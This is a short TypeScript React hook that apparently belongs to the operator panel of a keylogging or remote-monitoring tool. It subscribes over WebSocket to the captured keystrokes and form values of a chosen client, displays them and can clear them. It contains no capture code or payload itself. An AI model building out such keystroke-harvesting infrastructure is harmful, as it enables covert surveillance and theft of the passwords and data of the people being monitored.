import { useState, useCallback, useMemo } from "react";
import { useWebSocket } from "@/hooks/use-websocket";
import { buildViewerWsUrl } from "@/lib/utils";

export interface KeyloggerEntry {
  id?: number;
  elementDescriptor: string;
  elementType: string;
  eventType: "input" | "key" | "change";
  data: string;
  value: string;
  timestamp: number;
}

interface KeyloggerMessage {
  type: "init" | "entries" | "cleared" | "disconnected";
  entries?: KeyloggerEntry[];
}

interface UseKeyloggerResult {
  entries: KeyloggerEntry[];
  status: "connecting" | "open" | "closed";
  /** Send a clear command to the server and optimistically reset local state. */
  clearEntries: () => void;
}

/**
 * React hook that manages keylogger entries from a WebSocket viewer connection.
 *
 * Handles:
 *   - `init`        — replace all entries with persisted state from the server
 *   - `entries`     — append new incremental entries
 *   - `cleared`     — reset to empty (server cleared the DB)
 *   - `disconnected` — no-op (status reflects the WS close separately)
 *
 * @param clientId - The client whose keylogger entries to subscribe to.
 */
export function useKeylogger(clientId: string): UseKeyloggerResult {
  const [entries, setEntries] = useState<KeyloggerEntry[]>([]);

  const wsUrl = useMemo(() => buildViewerWsUrl(clientId, "keylogger"), [clientId]);

  const onMessage = useCallback((event: MessageEvent) => {
    let msg: KeyloggerMessage;
    try {
      msg = JSON.parse(event.data as string);
    } catch {
      return;
    }

    if (msg.type === "init") {
      setEntries(msg.entries ?? []);
    } else if (msg.type === "entries") {
      setEntries((prev) => [...prev, ...(msg.entries ?? [])]);
    } else if (msg.type === "cleared") {
      setEntries([]);
    }
  }, []);

  const { status, send } = useWebSocket(wsUrl, { onMessage });

  const clearEntries = useCallback(() => {
    send(JSON.stringify({ type: "clear" }));
    setEntries([]); // Optimistic reset
  }, [send]);

  return { entries, status, clearEntries };
}
